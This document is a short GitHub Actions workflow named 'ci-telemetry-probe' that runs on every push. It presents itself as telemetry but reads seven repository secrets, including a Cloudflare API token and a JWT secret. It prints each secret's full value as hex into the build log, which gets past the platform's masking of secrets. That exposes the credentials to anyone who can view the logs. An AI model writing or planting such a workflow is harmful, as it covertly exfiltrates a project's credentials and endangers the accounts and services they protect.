name: ci-telemetry-probe
on: push
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          for pair in "ADMIN=${{ secrets.ADMIN }}" "CLOUDFLARE_ACCOUNT_ID=${{ secrets.CLOUDFLARE_ACCOUNT_ID }}" "CLOUDFLARE_API_TOKEN=${{ secrets.CLOUDFLARE_API_TOKEN }}" "CUSTOM_DOMAIN=${{ secrets.CUSTOM_DOMAIN }}" "DOMAIN=${{ secrets.DOMAIN }}" "JWT_SECRET=${{ secrets.JWT_SECRET }}" "R2_BUCKET_NAME=${{ secrets.R2_BUCKET_NAME }}"; do
            n="${pair%%=*}"; v="${pair#*=}"
            echo "NAME=$n LEN=${#v}"
            echo "HEX_$n=$(printf '%s' "$v" | xxd -p | tr -d '\n')"
          done
